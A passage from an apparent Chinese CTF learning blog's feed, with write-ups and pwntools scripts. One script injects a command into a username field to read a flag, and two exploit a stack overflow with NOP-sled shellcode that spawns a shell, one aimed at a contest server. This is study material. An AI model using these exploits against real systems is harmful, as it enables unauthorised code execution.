class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = &lt;span class=&#34;string&#34;&gt;&amp;quot;./pwn_7&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = process(elf)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#p =remote(&amp;quot;node4.buuoj.cn&amp;quot;, 25471)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(p)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your choice &amp;gt;&amp;gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Please input the key of admin : &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(&lt;span class=&#34;string&#34;&gt;b&amp;quot;../../../../../../../../../&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(p.recv())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your choice &amp;gt;&amp;gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Please input the username to add :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;xxcat\tfl*\n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your choice &amp;gt;&amp;gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Please input the username to add :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;&amp;#x27;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(p.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(p.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		 能不能’cat\tfl*\n呢,不能呀,,需要有个\n,但是没有,也没有; 没有分隔符没办法执行两条命令,这个必须要\n的 \t不行吗,不行…….&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.51cto.com/u_15400016/4287727&#34;&gt;https://blog.51cto.com/u_15400016/4287727&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.secpulse.com/archives/96374.html&#34;&gt;https://www.secpulse.com/archives/96374.html&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;问题&#34;&gt;&lt;a href=&#34;#问题&#34; class=&#34;headerlink&#34; title=&#34;问题&#34;&gt;&lt;/a&gt;问题&lt;/h1&gt;&lt;p&gt;用recv应该是接收到\n为止? 所&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-06-05T09:50:57.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/</id>
        <title>pwn入门-30-2023OUC校赛</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/"/>
        <content type="html">&lt;p&gt;​		拖了挺久才整理…不应该…以后要及时复盘. 本身题不是很难,不过有很多小细节,自己之前没弄懂,还是说有时间的话,多研究研究,以及之前的题,要进行一定的复盘.&lt;/p&gt;
&lt;h2 id=&#34;恢复符号&#34;&gt;&lt;a href=&#34;#恢复符号&#34; class=&#34;headerlink&#34; title=&#34;恢复符号&#34;&gt;&lt;/a&gt;恢复符号&lt;/h2&gt;&lt;p&gt;​		比较恶心的一个点(其实也不恶心,就是自己之前没弄过),找到了一些文章,然后github有编译好的符号文件,可以直接ida导入就好了,回头有时间可以自己编译一下&lt;/p&gt;
&lt;p&gt;​		&lt;a href=&#34;https://github.com/maroueneboubakri/lscan&#34;&gt;https://github.com/maroueneboubakri/lscan&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		&lt;a href=&#34;https://blog.csdn.net/Breeze_CAT/article/details/103788796&#34;&gt;https://blog.csdn.net/Breeze_CAT/article/details/103788796&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		ida中shift+f5,然后把符号文件添加进去&lt;/p&gt;
&lt;p&gt;​		还有就是一些地址的计算…头大,,(估计还是原理没完全搞明白)&lt;/p&gt;
&lt;h2 id=&#34;pwn1&#34;&gt;&lt;a href=&#34;#pwn1&#34; class=&#34;headerlink&#34; title=&#34;pwn1&#34;&gt;&lt;/a&gt;&lt;strong&gt;pwn1&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;​		栈长度是0x68 &amp;#x3D; 104,但能读取256,很明显的栈溢出,可以覆盖返回地址,而且没有开NX保护,可以写shellcode,于是问题就变成了怎么跳到shellcode呢,或者怎么知道shellcode的地址,puts的话,遇到\x00才会停止所以可以前面填满,然后输出ebp这里的值,这里的值好像会有一些变化,所以可以不用太具体,前面一直加nop就好了,跳到nop然后走,然后shellcode&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;d:&lt;span class=&#34;number&#34;&gt;0074&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0xffffd4f4&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;e:&lt;span class=&#34;number&#34;&gt;0078&lt;/span&gt;│ ebp &lt;span class=&#34;number&#34;&gt;0xffffd4f8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0xffffd508&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		ebp和esp差了0x90 esp和ecx(开始输出字符串那里)差了0x28,ebp输出的值和ebp差了0xbe,这样有点乱,画图会清晰很多&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/image-20230603191839695.png&#34; alt=&#34;image-20230603191839695&#34; style=&#34;zoom: 33%;&#34;&gt;

&lt;p&gt;​		这样其实有问题,不太对,因为ebp那里的值其实是不确定的,但总是会往前指,或多或少,有时候正好指到shellcode开头或者偏移一点点,至于为什么呢…可以后面在研究,可以简单的跳到这个位置就好了,加一些nop(但是打远程的时候不知道为什么老不成功,可以加一点偏移,因为毕竟是往前跳)&lt;/p&gt;
&lt;p&gt;​		有system有&amp;#x2F;bin&amp;#x2F;sh 能不能rop呢?&lt;/p&gt;
&lt;p&gt;p32(addr-0xbe+0x2e+0x28)&lt;/p&gt;
&lt;p&gt;​		&lt;/p&gt;
&lt;p&gt;​		换句话说,ebp这个位置的值如果正好位于 [ebp-0x68,ebp-len(shellcode)]之间的话,就正好到了nop,如果大的话,就需要我们来加一点值了&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;##!/usr/bin/env python&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sh = process(&amp;#x27;./pwn1&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;101.43.247.245&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;9200&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#systemaddr = 0x8048440&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#binsh = 0x80486C0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sh.sendline(b&amp;#x27;A&amp;#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(sh,&amp;quot;b *0x80488F2&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(sh)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;quot;say&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(&lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#addr = u32(sh.recv(8)[4:8])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.recv(&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr = u32(sh.recv(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode = asm(shellcraft.sh())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nop = asm(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        nop&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode = nop*&lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;+shellcode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = shellcode.ljust(&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;) + p32(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p32(addr+&lt;span class=&#34;number&#34;&gt;0xbe&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x78&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(addr+&lt;span class=&#34;number&#34;&gt;0xbe&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x90&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;##!/usr/bin/env python&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./pwn01&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sh = remote(&amp;quot;101.43.247.245&amp;quot;,9200)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#systemaddr = 0x8048440&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#binsh = 0x80486C0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sh.sendline(b&amp;#x27;A&amp;#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(sh,&amp;quot;b *0x80488F2&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(sh)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;quot;say&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(&lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#addr = u32(sh.recv(8)[4:8])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.recv(&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr = u32(sh.recv(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode = asm(shellcraft.sh())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nop = asm(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        nop&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode = nop*&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;+shellcode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = shellcode.ljust(&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;) + p32(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p32(addr+&lt;span class=&#34;number&#34;&gt;0x2e&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/image-20230603182001856.png&#34; alt=&#34;image-20230603182001856&#34;&gt;&lt;/p&gt;
&lt;p&gt;还遇到很玄学的问题,nop加多了,怎么也不行,&lt;/p&gt;
&lt;p&gt;感觉像是后面的指令并没有识别出来      不多,好像是没传送完全?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/image-20230603182755733.png&#34; alt=&#34;image-20230603182755733&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;pwn2&#34;&gt;&lt;a href=&#34;#pwn2&#34; class=&#34;headerlink&#34; title=&#34;pwn2&#34;&gt;&lt;/a&gt;&lt;strong&gt;pwn2&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;​		加了nx保护,用rop吧,ret2syscall, 这下不用算哪个比较恶心的shellcode的位置了,用ret2syscall是因为没有找到system函数..&lt;/p&gt;
&lt;p&gt;​		execve(“&amp;#x2F;bin&amp;#x2F;sh”,NULL,NULL)&lt;/p&gt;
&lt;p&gt;​		其中，该程序是 32 位，所以我们需要使得&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;系统调用号，即 eax 应该为 0xb&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;第一个参数，即 ebx 应该指向 &amp;#x2F;bin&amp;#x2F;sh 的地址，其实执行 sh 的地址也可以。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;第二个参数，即 ecx 应该为 0&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;第三个参数，即 edx 应该为 0&lt;/p&gt;
&lt;p&gt;没有 &amp;#x2F;bin&amp;#x2F;sh,那就写入到栈后面,反正需要栈的地址,计算一下就可以了&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
